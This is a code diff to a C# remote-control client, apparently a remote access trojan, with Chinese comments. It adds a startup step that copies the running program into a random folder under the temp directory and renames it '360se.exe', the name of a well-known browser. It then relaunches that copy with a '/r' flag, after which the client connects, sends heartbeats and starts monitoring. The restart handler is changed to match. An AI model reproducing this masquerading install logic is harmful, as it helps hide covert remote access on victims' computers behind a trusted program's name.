@@ -48,12 +48,31 @@ namespace RemoteControl.Client
         {
             // 窗体隐藏时调用Console.Title会报错
             //Console.Title = "RC";
-            ReadParameters();
-            InitHandlers();
-            StartConnect();
-            heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
-            heartbeatThread.Start();
-            StartMonitor();
+            if (args.Length == 0)
+            {
+                // 进行安装操作
+                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
+                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
+                if (!System.IO.Directory.Exists(destinationFileDir))
+                {
+                    System.IO.Directory.CreateDirectory(destinationFileDir);
+                }
+                var destinationFilePath = destinationFileDir + "\\" + "360se.exe";
+                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
+                var t = ProcessUtil.RunByCmdStart(destinationFilePath, "/r", true);
+                t.Join();
+                return;
+            }
+            else if (args.Length == 1 && args[0] == "/r")
+            {
+                // 进行运行操作
+                ReadParameters();
+                InitHandlers();
+                StartConnect();
+                heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
+                heartbeatThread.Start();
+                StartMonitor();
+            }
         }
 
         static void InitHandlers()
@@ -575,7 +594,7 @@ namespace RemoteControl.Client
             else if (packetType == ePacketType.PACKET_RESTART_APP_REQUEST)
             {
                 string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-                var thread = ProcessUtil.Run(path, "", true);
+                var thread = ProcessUtil.Run(path, "/r", true);
                 thread.Join();
                 Environment.Exit(0);
             }
